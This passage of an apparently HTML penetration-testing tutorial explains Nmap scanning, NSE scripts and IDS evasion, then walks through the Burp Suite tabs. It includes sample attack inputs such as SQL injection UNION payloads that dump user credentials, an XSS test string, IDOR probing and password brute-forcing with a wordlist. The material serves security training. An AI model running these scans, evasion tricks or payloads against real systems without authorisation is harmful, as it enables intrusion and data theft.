nmap 192.168.1.0/24                      # Entire subnet (256 hosts)
nmap 192.168.1.* 192.168.2.*             # Wildcard

# Scan from file:
nmap -iL targets.txt
# -iL targets.txt  ← Input list (one IP/hostname per line)

# Exclude targets:
nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.254
# --exclude  ← Skip these hosts (router, critical servers)</div>

            <h5>Scan Types - How Nmap Probes Ports</h5>

            <div class="code"># TCP SYN Scan (stealth scan, default with root):
nmap -sS 192.168.1.1
# -sS  ← SYN scan (half-open scan)
# How it works:
#   1. Send SYN packet
#   2. If SYN/ACK received → port OPEN
#   3. If RST received → port CLOSED
#   4. If no response → port FILTERED
# Doesn't complete TCP handshake = "stealth"
# Requires root/admin privileges
# Fast and efficient!

# TCP Connect Scan (full 3-way handshake):
nmap -sT 192.168.1.1
# -sT  ← TCP connect scan
# How it works:
#   1. Complete full TCP 3-way handshake
#   2. OS establishes full connection
# Used when: No root privileges OR raw packet access unavailable
# Slower than SYN scan
# Shows in target's connection logs!

# UDP Scan:
nmap -sU 192.168.1.1
# -sU  ← UDP scan
# Finds: DNS (53), SNMP (161), DHCP (67/68), NTP (123)
# SLOW! (timeouts for closed ports)
# Combine with TCP: nmap -sS -sU 192.168.1.1

# NULL/FIN/Xmas Scans (evade simple firewalls):
nmap -sN 192.168.1.1  # NULL scan (no flags set)
nmap -sF 192.168.1.1  # FIN scan (FIN flag set)
nmap -sX 192.168.1.1  # Xmas scan (FIN, PSH, URG flags set)
# How they work:
#   - Send packet with unusual flags
#   - Closed port responds with RST
#   - Open port does NOT respond (stealthy!)
# Evades: Stateless firewalls
# Doesn't work: Windows (responds to all packets)

# ACK Scan (firewall rule mapping):
nmap -sA 192.168.1.1
# -sA  ← ACK scan
# Purpose: Map firewall rules (not find open ports!)
# Response:
#   - RST = port UNFILTERED (firewall allows)
#   - No response = port FILTERED (firewall blocks)
# Useful for: Understanding firewall behavior

# Window Scan (distinguish open from closed):
nmap -sW 192.168.1.1
# -sW  ← Window scan
# Examines TCP window size in RST packet
# Some systems: Different window for open vs closed

# SCTP INIT Scan (for SCTP services):
nmap -sY 192.168.1.1
# -sY  ← SCTP INIT scan
# For: Stream Control Transmission Protocol (VoIP, SS7)</div>

            <h5>Port Specification - Choose What to Scan</h5>

            <div class="code"># Scan specific ports:
nmap -p 22 192.168.1.1                    # Single port (SSH)
nmap -p 22,80,443 192.168.1.1             # Multiple ports
nmap -p 1-1000 192.168.1.1                # Port range
nmap -p- 192.168.1.1                      # ALL 65535 ports (SLOW!)

# FLAGS EXPLAINED:
# -p <port>  ← Port specification
# Default: Scans 1000 most common ports
# -p- = scan ALL ports (1-65535)

# Scan by protocol:
nmap -p U:53,T:21-25,80 192.168.1.1
# U:53     ← UDP port 53 (DNS)
# T:21-25  ← TCP ports 21-25 (FTP, SSH, Telnet, SMTP)
# T:80     ← TCP port 80 (HTTP)

# Fast scan (100 most common ports):
nmap -F 192.168.1.1
# -F  ← Fast mode
# Scans only 100 ports (vs default 1000)
# Much faster!

# Top ports:
nmap --top-ports 20 192.168.1.1
# --top-ports 20  ← Scan 20 most common ports
# Useful for: Quick reconnaissance

# Scan ports by name:
nmap -p http,https,ssh 192.168.1.1
# Scans ports: 80, 443, 22

# Consecutive ports:
nmap -p 1-100,443,8000-9000 192.168.1.1
# Scans: 1-100, 443, 8000-9000

# Exclude ports:
nmap -p 1-1000 --exclude-ports 135,139,445 192.168.1.1
# --exclude-ports  ← Skip these ports</div>

            <h5>Service/Version Detection - Identify Running Services</h5>

            <div class="code"># Version detection:
nmap -sV 192.168.1.1
# -sV  ← Service/version detection
# Probes open ports to determine:
#   - Service name (SSH, HTTP, MySQL)
#   - Version (OpenSSH 8.2p1, Apache 2.4.41)
#   - Extra info (OS, device type)

# Example output:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

# Version intensity:
nmap -sV --version-intensity 0 192.168.1.1  # Light probing (fast, less accurate)
nmap -sV --version-intensity 5 192.168.1.1  # Normal (default)
nmap -sV --version-intensity 9 192.168.1.1  # Aggressive (slow, most accurate)
# --version-intensity <0-9>
#   0 = Light (try 2 probes)
#   5 = Default
#   9 = Try ALL probes (slow but thorough!)

# Light version scan:
nmap -sV --version-light 192.168.1.1
# Equivalent to --version-intensity 2

# Aggressive version scan:
nmap -sV --version-all 192.168.1.1
# Equivalent to --version-intensity 9
# Tries EVERY single probe (very slow!)

# RPC services:
nmap -sV --version-trace 192.168.1.1
# --version-trace  ← Show detailed version detection process
# For debugging when version detection fails</div>

            <h5>OS Detection - Identify Operating System</h5>

            <div class="code"># OS detection:
nmap -O 192.168.1.1
# -O  ← Enable OS detection
# Analyzes: TCP/IP stack fingerprints
# Example output:
# OS details: Linux 5.4 - 5.10
# Network Distance: 2 hops

# Aggressive OS detection:
nmap -O --osscan-guess 192.168.1.1
# --osscan-guess  ← Make best guess when uncertain
# Shows confidence percentage

# OS detection only (skip port scan):
nmap -O --osscan-limit 192.168.1.1
# --osscan-limit  ← Only scan hosts with open+closed ports
# Skips: Hosts with all filtered ports (faster)

# Maximum OS detection retries:
nmap -O --max-os-tries 1 192.168.1.1
# --max-os-tries 1  ← Try OS detection once (faster)
# Default: 5 tries</div>

            <h5>Timing and Performance - Control Scan Speed</h5>

            <div class="code"># Timing templates (simplest way to control speed):
nmap -T0 192.168.1.1  # Paranoid (slowest, evade IDS)
nmap -T1 192.168.1.1  # Sneaky
nmap -T2 192.168.1.1  # Polite (less bandwidth)
nmap -T3 192.168.1.1  # Normal (default)
nmap -T4 192.168.1.1  # Aggressive (fast, assume reliable network)
nmap -T5 192.168.1.1  # Insane (fastest, may sacrifice accuracy)

# BEGINNER EXPLANATION:
# -T<0-5>  ← Timing template
# T0-T1: VERY slow (IDS evasion, takes hours!)
# T2: Polite (slow, 0.4s between probes)
# T3: Default (good for most scans)
# T4: Fast (assumes reliable network, 0.9ms between probes)
# T5: Insane (may miss ports, only on fast networks!)

# For CTFs/labs: Use -T4
# For real engagements: Use -T2 or -T3 (stealthier)

# Fine-grained timing control:

# Parallelism (simultaneous probes):
nmap --min-parallelism 10 --max-parallelism 100 192.168.1.1
# --min-parallelism 10  ← Minimum 10 parallel probes
# --max-parallelism 100  ← Maximum 100 parallel probes
# Higher = faster but noisier

# RTT timeout (round-trip time):
nmap --min-rtt-timeout 100ms --max-rtt-timeout 300ms 192.168.1.1
# --min-rtt-timeout  ← Minimum time to wait for response
# --max-rtt-timeout  ← Maximum time to wait
# Lower = faster but may miss slow hosts

# Host timeout:
nmap --host-timeout 5m 192.168.1.1
# --host-timeout 5m  ← Give up on host after 5 minutes
# Prevents: One slow host holding up entire scan

# Scan delay:
nmap --scan-delay 1s 192.168.1.1
# --scan-delay 1s  ← Wait 1 second between probes
# Use for: IDS evasion, slow networks

# Maximum retries:
nmap --max-retries 1 192.168.1.1
# --max-retries 1  ← Retry closed/filtered ports once
# Default: 10 retries
# Lower = faster but less accurate</div>

            <h5>NSE Scripts - Nmap Scripting Engine (POWERFUL!)</h5>

            <div class="code"># List all scripts:
ls /usr/share/nmap/scripts/
# 600+ NSE scripts for everything!

# View script help:
nmap --script-help http-enum
# Shows: What script does, categories, example usage

# Script categories:
# auth     = Authentication testing
# brute    = Brute force attacks
# default  = Safe scripts (run with -sC)
# discovery = Network discovery
# dos      = Denial of service
# exploit  = Exploit vulnerabilities
# external = Query external services
# fuzzer   = Send unexpected input
# intrusive = May crash target
# malware  = Malware detection
# safe     = Won't harm target
# version  = Version detection enhancement
# vuln     = Vulnerability detection

# Run default scripts:
nmap -sC 192.168.1.1
# -sC  ← Run default NSE scripts
# Same as: --script=default

# Run specific script:
nmap --script http-enum 192.168.1.1
# --script http-enum  ← Web directory enumeration

# Run multiple scripts:
nmap --script http-enum,http-headers,http-methods 192.168.1.1

# Run all scripts in category:
nmap --script vuln 192.168.1.1
# Runs ALL vulnerability detection scripts!

# Wildcard:
nmap --script "http-*" 192.168.1.1
# Runs all scripts starting with "http-"

# Boolean logic:
nmap --script "http-* and not http-brute" 192.168.1.1
# Runs all HTTP scripts EXCEPT http-brute

# Script arguments:
nmap --script http-enum --script-args http-enum.basepath=/admin/ 192.168.1.1
# --script-args  ← Pass arguments to scripts

# Update script database:
sudo nmap --script-updatedb
# Downloads latest NSE scripts</div>

            <h5>Essential NSE Scripts Every Pentester Uses</h5>

            <div class="code"># === VULNERABILITY SCANNING ===

# Scan for common vulnerabilities:
nmap --script vuln 192.168.1.1
# Checks for: CVEs, misconfigurations, known vulns

# SMB vulnerabilities (EternalBlue, MS08-067):
nmap --script smb-vuln-* 192.168.1.1
# Detects: MS17-010 (EternalBlue), MS08-067, MS06-025

# SSL/TLS vulnerabilities (Heartbleed, POODLE):
nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection 192.168.1.1

# === WEB APPLICATION TESTING ===

# Enumerate web directories:
nmap --script http-enum 192.168.1.1
# Finds: /admin, /backup, /test, /phpmyadmin

# HTTP methods allowed:
nmap --script http-methods 192.168.1.1
# Shows: GET, POST, PUT, DELETE (PUT/DELETE = potential vuln!)

# HTTP headers:
nmap --script http-headers 192.168.1.1
# Shows: Server, X-Powered-By, cookies

# Detect WAF:
nmap --script http-waf-detect 192.168.1.1

# WordPress/Joomla enumeration:
nmap --script http-wordpress-enum 192.168.1.1

# === DATABASE TESTING ===

# MySQL info:
nmap --script mysql-info 192.168.1.1

# MySQL empty password:
nmap --script mysql-empty-password 192.168.1.1

# MS-SQL info:
nmap --script ms-sql-info 192.168.1.1

# MongoDB info:
nmap --script mongodb-info 192.168.1.1

# === SMB ENUMERATION ===

# SMB version:
nmap --script smb-os-discovery 192.168.1.1
# Shows: OS, domain, hostname

# SMB shares:
nmap --script smb-enum-shares 192.168.1.1

# SMB users:
nmap --script smb-enum-users 192.168.1.1

# SMB sessions:
nmap --script smb-enum-sessions 192.168.1.1

# === DNS ENUMERATION ===

# DNS brute force:
nmap --script dns-brute example.com

# DNS zone transfer:
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 192.168.1.1

# === BRUTE FORCING ===

# SSH brute force:
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1

# FTP brute force:
nmap --script ftp-brute 192.168.1.1

# HTTP brute force:
nmap --script http-brute --script-args http-brute.path=/admin/ 192.168.1.1

# === MISCELLANEOUS ===

# Check for default credentials:
nmap --script auth 192.168.1.1

# Banner grabbing (detailed):
nmap --script banner 192.168.1.1

# Traceroute with geolocation:
nmap --script traceroute-geolocation 192.168.1.1

# Broadcast discovery:
nmap --script broadcast-dhcp-discover

# Malware detection:
nmap --script malware 192.168.1.1</div>

            <h5>Firewall/IDS Evasion - Bypass Detection</h5>

            <div class="code"># Fragment packets:
nmap -f 192.168.1.1
# -f  ← Fragment IP packets
# Splits packets into tiny 8-byte fragments
# May bypass: Simple packet filters

# Custom MTU:
nmap --mtu 16 192.168.1.1
# --mtu 16  ← Set Maximum Transmission Unit
# Must be multiple of 8
# Smaller MTU = more fragments

# Decoy scanning:
nmap -D RND:10 192.168.1.1
# -D RND:10  ← Use 10 random decoy IPs
# Target sees: Scans from YOUR IP + 10 fake IPs
# Hides your IP in noise!

# Specific decoys:
nmap -D 192.168.1.100,192.168.1.200,ME 192.168.1.1
# ME = your real IP position in decoy list

# Idle/Zombie scan (ULTIMATE stealth):
nmap -sI zombie_host 192.168.1.1
# -sI zombie_host  ← Use zombie host to scan
# Zombie = host with predictable IP ID sequence
# Target never sees YOUR IP!
# Advanced technique, read: nmap.org/book/idlescan.html

# Spoof source IP:
nmap -S 192.168.1.254 192.168.1.1
# -S 192.168.1.254  ← Spoof source IP
# Target thinks scan came from .254
# WARNING: You won't receive responses!

# Spoof MAC address:
nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1
# --spoof-mac  ← Change source MAC
# Use 0 for random MAC

# Randomize target order:
nmap --randomize-hosts 192.168.1.0/24
# --randomize-hosts  ← Scan hosts in random order
# Harder to detect patterns

# Use proxies:
nmap --proxies socks4://proxy1:1080,http://proxy2:8080 192.168.1.1
# --proxies  ← Chain through proxy servers

# Bad checksum (test firewall):
nmap --badsum 192.168.1.1
# --badsum  ← Send packets with invalid checksum
# Firewalls may forward without checking
# Real OS will drop packets

# Append random data:
nmap --data-length 50 192.168.1.1
# --data-length 50  ← Add 50 random bytes to packets
# Evade: Signature-based IDS</div>

            <h5>Output Options - Save Your Results</h5>

            <div class="code"># Normal output (to terminal + file):
nmap 192.168.1.1 -oN scan_results.txt
# -oN  ← Normal output (human-readable)

# XML output (for parsing):
nmap 192.168.1.1 -oX scan_results.xml
# -oX  ← XML output
# Parse with: Python, Ruby, Go
# Import into: Metasploit, other tools

# Grepable output:
nmap 192.168.1.1 -oG scan_results.gnmap
# -oG  ← Grepable format
# Easy to grep: grep "open" scan_results.gnmap

# All formats:
nmap 192.168.1.1 -oA scan_results
# -oA  ← Output ALL formats
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Script kiddie output:
nmap 192.168.1.1 -oS scan_results_l33t.txt
# -oS  ← Script kiddie format (leet speak!)
# Just for fun 😄

# Append to file:
nmap 192.168.1.1 -oN scan_results.txt --append-output
# --append-output  ← Don't overwrite, append

# Verbose output:
nmap -v 192.168.1.1
# -v  ← Verbose (show progress)
# -vv = Very verbose
# -vvv = Even more verbose!

# Debugging:
nmap -d 192.168.1.1
# -d  ← Debug mode
# -dd = More debug info
# Use when: Scan behaves unexpectedly

# Show only open ports:
nmap --open 192.168.1.1
# --open  ← Only show open ports
# Hides: Closed and filtered ports

# Show reason port is open/closed:
nmap --reason 192.168.1.1
# --reason  ← Why Nmap marked port as open/closed
# Example: "syn-ack" (SYN/ACK response received)</div>

            <h5>Advanced Host Discovery - Find Live Hosts</h5>

            <div class="code"># Default host discovery (before port scan):
# Nmap sends:
#   - ICMP echo request (ping)
#   - TCP SYN to port 443
#   - TCP ACK to port 80
#   - ICMP timestamp request

# Skip host discovery (assume host is up):
nmap -Pn 192.168.1.1
# -Pn  ← No ping (treat host as up)
# Use when: Firewall blocks ICMP
# Slower (scans even dead hosts)

# ICMP ping:
nmap -PE 192.168.1.1
# -PE  ← ICMP echo request (standard ping)

# ICMP timestamp:
nmap -PP 192.168.1.1
# -PP  ← ICMP timestamp request
# Alternative when echo blocked

# ICMP netmask:
nmap -PM 192.168.1.1
# -PM  ← ICMP netmask request

# TCP SYN discovery:
nmap -PS22,80,443 192.168.1.1
# -PS  ← TCP SYN ping to ports 22,80,443
# Effective against firewalls!

# TCP ACK discovery:
nmap -PA22,80,443 192.168.1.1
# -PA  ← TCP ACK ping
# Bypasses: Stateless firewalls

# UDP discovery:
nmap -PU53,161 192.168.1.1
# -PU  ← UDP ping to ports 53,161
# Useful for: Discovering firewalls/routers

# ARP discovery (local network only):
nmap -PR 192.168.1.0/24
# -PR  ← ARP ping
# Fastest on local network
# Can't be blocked (layer 2!)

# Disable DNS resolution:
nmap -n 192.168.1.1
# -n  ← Never do DNS resolution
# Faster!

# Force DNS resolution (for all hosts):
nmap -R 192.168.1.1
# -R  ← Always do DNS resolution

# Custom DNS servers:
nmap --dns-servers 8.8.8.8,1.1.1.1 192.168.1.1
# --dns-servers  ← Use custom DNS</div>

            <h5>Real-World Nmap Command Examples</h5>

            <div class="code"># === PENTESTING WORKFLOW ===

# 1. Quick network discovery:
nmap -sn 192.168.1.0/24
# -sn  ← Ping scan only (no port scan)
# Finds: All live hosts on network

# 2. Fast port scan of live hosts:
nmap -T4 -F 192.168.1.1-254
# -T4 = Fast
# -F = Top 100 ports

# 3. Comprehensive scan of interesting hosts:
nmap -sS -sV -O -A -p- -T4 -oA full_scan 192.168.1.10
# -sS = SYN scan
# -sV = Version detection
# -O = OS detection
# -A = Aggressive (OS, version, scripts, traceroute)
# -p- = All 65535 ports
# -oA = All output formats

# === SPECIFIC SCENARIOS ===

# Web server deep scan:
nmap -p 80,443 -sV --script "http-*" 192.168.1.10

# SMB enumeration (Active Directory):
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.1.10

# Vulnerability scan:
nmap --script vuln -oA vuln_scan 192.168.1.10

# Stealth scan (IDS evasion):
nmap -sS -T2 -f -D RND:10 --randomize-hosts 192.168.1.0/24

# UDP + TCP combined:
nmap -sSU -p T:1-1000,U:53,161,500 192.168.1.1

# === CTF/HTB QUICK COMMANDS ===

# Initial recon:
nmap -sC -sV -oA initial 10.10.10.10

# Full port scan:
nmap -p- -T4 --min-rate 1000 10.10.10.10

# Detailed scan of found ports:
nmap -p 22,80,443,8080 -sC -sV -A 10.10.10.10

# === BUG BOUNTY ===

# Subdomain discovery + port scan:
nmap -iL subdomains.txt -p 80,443,8080,8443 --open -oA web_services

# Check for common vulns:
nmap --script http-vuln-* -p 80,443 target.com</div>

            <div class="metaphor-box">
                <h4>💡 Nmap Mastery Summary</h4>
                <p><strong>Essential Nmap skills every hacker needs:</strong><br><br>
                <strong>1. Basic reconnaissance:</strong><br>
                • <code>nmap -sn 192.168.1.0/24</code> → Find live hosts<br>
                • <code>nmap -sS -p- target.com</code> → Scan all ports<br>
                • <code>nmap -sV -O target.com</code> → Identify services and OS<br><br>
                <strong>2. Advanced enumeration:</strong><br>
                • <code>nmap -sC -sV -oA scan target</code> → Full enumeration<br>
                • <code>nmap --script vuln target</code> → Find vulnerabilities<br>
                • <code>nmap -A target</code> → Everything (aggressive)<br><br>
                <strong>3. Evasion techniques:</strong><br>
                • <code>-T2</code> → Slow and stealthy<br>
                • <code>-f</code> → Fragment packets<br>
                • <code>-D RND:10</code> → Decoy scan (hide in noise)<br>
                • <code>--spoof-mac 0</code> → Random MAC address<br><br>
                <strong>4. NSE Scripts power:</strong><br>
                • <code>--script vuln</code> → Vulnerability detection<br>
                • <code>--script http-enum</code> → Web directory discovery<br>
                • <code>--script smb-vuln-*</code> → SMB vulnerabilities (EternalBlue!)<br>
                • <code>--script ssh-brute</code> → SSH password guessing<br><br>
                <strong>5. Performance tuning:</strong><br>
                • <code>-T4</code> → Fast (CTF/lab environments)<br>
                • <code>--min-rate 1000</code> → Maintain 1000 packets/sec<br>
                • <code>-F</code> → Fast scan (top 100 ports)<br>
                • <code>-p-</code> → All 65535 ports (thorough)<br><br>
                <strong>Pro tips:</strong><br>
                • Always save output with <code>-oA</code> (all formats)<br>
                • Use <code>-Pn</code> if ICMP is blocked<br>
                • Combine TCP and UDP: <code>-sSU</code><br>
                • Read the book: <strong>nmap.org/book/</strong> (free online!)<br>
                • Learn NSE scripting: Write your own scripts in Lua!<br><br>
                Nmap is THE most important tool in penetration testing. Master it = unlock the entire network! 🌐🔍</p>
            </div>

            <h3>B-Tools: Burp Suite, BloodHound, and More</h3>

            <h4>Burp Suite (THE Ultimate Web Application Testing Tool)</h4>

            <p><strong>What is it?</strong> Burp Suite is THE industry-standard web proxy and security testing platform. Every web pentester uses Burp! It intercepts HTTP/HTTPS traffic, allowing you to modify requests, scan for vulnerabilities, and exploit web apps. Has free (Community) and paid (Professional) versions.</p>

            <h5>Getting Started with Burp Suite</h5>

            <div class="code"># Start Burp Suite:
burpsuite
# Or from applications menu: Kali → Web Application Analysis → burpsuite

# BEGINNER EXPLANATION:
# Burp Suite = web proxy that sits between your browser and target
# Your browser → Burp Suite → Target website
# Burp captures ALL requests/responses
# You can: View, modify, resend, scan, exploit

# Configure browser proxy:
# Firefox: Preferences → Network Settings → Manual proxy
#   HTTP Proxy: 127.0.0.1
#   Port: 8080
#   ☑ Use this proxy for HTTPS
# Chrome: Use FoxyProxy extension

# Import Burp CA certificate (for HTTPS):
# 1. Browse to: http://burp
# 2. Click "CA Certificate" (top-right)
# 3. Save as burp-cert.der
# 4. Firefox: Settings → Privacy & Security → Certificates → Import
# 5. Trust for websites</div>

            <h5>Proxy Tab - Intercept and Modify Traffic</h5>

            <div class="code"># === INTERCEPTING REQUESTS ===

# Enable intercept:
# Proxy tab → Intercept → "Intercept is on"

# Now browse target website in browser
# Burp catches request BEFORE sending!

# WHAT YOU SEE:
# GET /admin/login HTTP/1.1
# Host: target.com
# User-Agent: Mozilla/5.0...
# Cookie: session=abc123

# ACTIONS YOU CAN TAKE:
# - Forward: Send request as-is
# - Drop: Cancel request (never sent)
# - Action → Send to Repeater: Manual testing
# - Action → Send to Intruder: Automated fuzzing
# - Action → Send to Scanner: Vulnerability scan

# === MODIFYING REQUESTS ===

# Example 1: Change POST parameter
# Original:
# username=user&password=pass123

# Modified:
# username=admin&password=pass123
# Then click "Forward"

# Example 2: Add admin cookie
# Original:
# Cookie: session=abc123

# Modified:
# Cookie: session=abc123; isAdmin=true
# Test for privilege escalation!

# Example 3: Change HTTP method
# Original:
# POST /api/users/123 HTTP/1.1

# Modified:
# GET /api/users/123 HTTP/1.1
# Might bypass authentication!

# === INTERCEPT RESPONSES ===

# Proxy → Options → Intercept Server Responses
# ☑ Intercept responses based on these rules

# Modify server responses before browser sees them!
# Example: Change "Account: Free" → "Account: Premium"</div>

            <h5>Repeater Tab - Manual Testing</h5>

            <div class="code"># Repeater = manually modify and resend requests

# WORKFLOW:
# 1. Right-click request in Proxy/Target → "Send to Repeater"
# 2. Go to Repeater tab
# 3. Modify request
# 4. Click "Send"
# 5. View response
# 6. Repeat!

# === SQL INJECTION TESTING ===

# Original request:
# GET /search?query=admin HTTP/1.1

# Test 1: Basic SQLi
# GET /search?query=admin' HTTP/1.1
# Look for SQL error in response!

# Test 2: Union injection
# GET /search?query=admin' UNION SELECT NULL-- HTTP/1.1
# GET /search?query=admin' UNION SELECT NULL,NULL-- HTTP/1.1
# GET /search?query=admin' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
# Find number of columns

# Test 3: Extract data
# GET /search?query=admin' UNION SELECT username,password FROM users-- HTTP/1.1
# Dump database!

# === XSS TESTING ===

# Test reflected XSS:
# GET /search?query=<script>alert(1)</script> HTTP/1.1

# If response contains unescaped:
# <h1>Search results for: <script>alert(1)</script></h1>
# = VULNERABLE!

# === IDOR TESTING ===

# Original:
# GET /api/user/profile?id=1337 HTTP/1.1
# Returns YOUR profile

# Test IDOR:
# GET /api/user/profile?id=1 HTTP/1.1
# GET /api/user/profile?id=2 HTTP/1.1
# GET /api/user/profile?id=1000 HTTP/1.1
# Can you access OTHER users' profiles?

# === COMPARE RESPONSES ===

# Right-click in Repeater → "Send to Comparer"
# Compare response differences
# Useful for: Boolean-based SQLi, timing attacks</div>

            <h5>Intruder Tab - Automated Fuzzing and Brute Forcing</h5>

            <div class="code"># Intruder = automated payload injection

# WORKFLOW:
# 1. Send request to Intruder
# 2. Configure attack positions (where to inject payloads)
# 3. Load payloads
# 4. Start attack
# 5. Analyze results

# === ATTACK TYPES ===

# Sniper: One payload set, one position at a time
# Example: Test one parameter with wordlist

# Battering ram: One payload set, ALL positions get same value
# Example: username=PAYLOAD&password=PAYLOAD

# Pitchfork: Multiple payload sets, parallel iteration
# Example: username=user1&password=pass1, then username=user2&password=pass2

# Cluster bomb: Multiple payload sets, try ALL combinations
# Example: Try every username with every password (Cartesian product)

# === SET ATTACK POSITIONS ===

# Original request:
# POST /login HTTP/1.1
# username=admin&password=test123

# Mark parameters:
# username=§admin§&password=§test123§
# Click "Add §" button to mark positions

# === LOAD PAYLOADS ===

# Payload set 1 (for username):
# Payload type: Simple list
# Payload options:
#   admin
#   administrator
#   root
#   user
#   test

# Payload set 2 (for password):
# Payload type: Simple list
# Load from file: /usr/share/wordlists/rockyou.txt

# === USEFUL PAYLOAD TYPES ===

# Simple list: Custom wordlist
# Numbers: 1-1000, increments
# Usernames generator: common usernames
# Dates: date ranges
# Null payloads: no payload (test baseline)
# Character substitution: p@ssw0rd variations
# Case modification: Admin, ADMIN, admin
# Recursive grep: Extract from responses

# === PAYLOAD PROCESSING ===

# Add prefix/suffix:
# Rule: Add prefix: 'OR 1=1--
# Payload: admin → 'OR 1=1--admin

# Encode:
# URL-encode
# HTML-encode
# Base64-encode

# === ANALYZE RESULTS ===

# Sort by:
# - Status code (200 vs 403 vs 302)
# - Length (different response = potentially valid cred!)
# - Response time (SQL injection timing attacks)

# Filter:
# Show only: Status code = 302 (successful login redirect!)

# === EXAMPLE ATTACKS ===

# 1. Username enumeration:
# POST /login HTTP/1.1
# username=§payload§&password=wrongpass

# Valid username: "Incorrect password"
# Invalid username: "User not found"
# Length differs!

# 2. Password brute force:
# POST /login HTTP/1.1
# username=admin&password=§payload§

# Success: Status 302, Length 0 (redirect to /dashboard)
# Failure: Status 200, Length 1523 (error message)

# 3. Parameter fuzzing:
# GET /api/users?sort=§payload§

# Payloads: name, id, email, created_at, admin, password
# Find hidden parameters!</div>

            <h5>Scanner Tab - Automated Vulnerability Scanning (Pro Only)</h5>

            <div class="code"># Scanner = automated vulnerability detection (Burp Professional ONLY!)
# Free version (Community) does NOT have scanner

# === PASSIVE SCANNING ===

# Automatically analyzes traffic for:
# - Cookie security flags (HttpOnly, Secure, SameSite)
# - Cleartext password submission
# - Cross-domain script inclusion
# - CSRF vulnerabilities
# - Missing security headers

# View results:
# Target → Site map → Right-click domain → "Issue activity"

# === ACTIVE SCANNING (Pro) ===

# Right-click request → "Scan"
# Or: Target → Site map → Right-click → "Actively scan this branch"

# Tests for:
# - SQL injection
# - XSS (reflected, stored, DOM-based)
# - XXE (XML External Entity)
# - SSRF (Server-Side Request Forgery)
# - Command injection
# - Path traversal
# - Open redirects
# - CSRF
# - Deserialization vulns

# Scan configuration:
# Fast: Quick tests only
# Normal: Balanced
# Thorough: Exhaustive (slow!)

# === CRAWLING ===

# Target → Site map → Right-click domain → "Spider this host"
# Automatically discovers: All links, forms, parameters
# Useful before scanning!

# === ISSUE DEFINITIONS ===

# Each vulnerability shows:
# - Severity: High, Medium, Low, Info
# - Confidence: Certain, Firm, Tentative
# - Description: What it is
# - Remediation: How to fix
# - References: CWE, OWASP links
# - Request/Response: Proof of vulnerability

# === EXPORT RESULTS ===

# Target → Site map → Right-click → "Report selected issues"
# Formats: HTML, XML
# For: Client reports, documentation</div>

            <h5>Decoder Tab - Encoding/Decoding</h5>

            <div class="code"># Decoder = encode/decode data

# === SUPPORTED ENCODINGS ===

# URL encode/decode:
# admin%40example.com → admin@example.com

# HTML encode/decode:
# &lt;script&gt; → <script>

# Base64 encode/decode:
# admin:password → YWRtaW46cGFzc3dvcmQ=

# ASCII hex:
# admin → 61646d696e

# Hex, Octal, Binary

# Gzip compress/decompress

# === SMART DECODE ===

# Paste encoded data
# Click "Smart decode"
# Burp automatically detects encoding!

# Example:
# Input: JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=
# Smart decode shows:
#   Step 1: Base64 decode → %3Cscript%3Ealert(1)%3C%2Fscript%3E
#   Step 2: URL decode → <script>alert(1)</script>

# === HASH FUNCTIONS ===

# Generate hashes:
# SHA-1, SHA-256, MD5

# Useful for:
# - Password hash cracking
# - Integrity verification
# - Token generation</div>

            <h5>Comparer Tab - Response Comparison</h5>

            <div class="code"># Comparer = compare two requests/responses

# USE CASES:

# 1. Boolean-based SQL injection:
# Send two requests:
#   /search?id=1 AND 1=1--  (TRUE)
#   /search?id=1 AND 1=2--  (FALSE)
# Compare responses
# Different response = SQLi confirmed!

# 2. Timing attack baseline:
# Request 1: Normal timing
# Request 2: With SLEEP(5) payload
# Different response time = SQLi!

# 3. Username enumeration:
# Request 1: Valid username
# Request 2: Invalid username
# Different response = enumeration possible!

# === HOW TO USE ===

# 1. Right-click request → "Send to Comparer"
# 2. Send another request → "Send to Comparer"
# 3. Go to Comparer tab
# 4. Select both items
# 5. Click "Words" or "Bytes"
# 6. View differences (highlighted!)

# Words: Text-based comparison
# Bytes: Exact byte-by-byte</div>

            <h5>Extender Tab - Plugins (BApp Store)</h5>

            <div class="code"># Extender = add functionality with plugins

# === POPULAR EXTENSIONS ===

# Autorize: Test for broken authorization
# Install: Extender → BApp Store → Autorize → Install

# How it works:
# 1. Configure low-privilege user token
# 2. Browse as admin
# 3. Autorize replays ALL requests with low-priv token
# 4. Highlights if low-priv gets access (broken authz!)

# Logger++: Advanced logging
# Install: Extender → BApp Store → Logger++ → Install
# Features:
# - Advanced filters
# - Color-coded logging
# - Export to CSV

# Param Miner: Find hidden parameters
# Install: Extender → BApp Store → Param Miner → Install
# Right-click request → "Param Miner" → "Guess parameters"
# Finds: Hidden params, headers, cookies

# Turbo Intruder: Fast brute-forcing (bypasses rate limits!)
# Install: Extender → BApp Store → Turbo Intruder → Install
# Uses: HTTP/2, connection pooling
# Much faster than regular Intruder!

# JSON Web Tokens: JWT manipulation
# Install: Extender → BApp Store → JSON Web Tokens → Install
# Automatically detects JWT tokens
# Test: Algorithm confusion, weak secrets

# === INSTALL EXTENSIONS ===

# Method 1: BApp Store (easiest)
# Extender → BApp Store → Browse → Install

# Method 2: Manual JAR file
# Extender → Extensions → Add
# Select .jar file

# === WRITE CUSTOM EXTENSIONS ===

# Languages supported: Java, Python, Ruby
# Extender → APIs
# Full Burp Suite API access
# Example: Auto-exploit SQLi, custom scanners</div>

            <div class="metaphor-box">
                <h4>💡 Burp Suite Complete Workflow</h4>
                <p><strong>Professional web app pentesting process:</strong><br><br>
                <strong>1. Setup (5 mins):</strong><br>
                • Start Burp Suite<br>
                • Configure browser proxy (127.0.0.1:8080)<br>
                • Import CA certificate<br>
                • Enable intercept<br><br>
                <strong>2. Reconnaissance (30 mins):</strong><br>
                • Target → Site map → Spider/Crawl<br>
                • Manually browse application (all features!)<br>
                • Burp maps entire app structure<br>
                • Identify: Login, API endpoints, file uploads, admin panels<br><br>
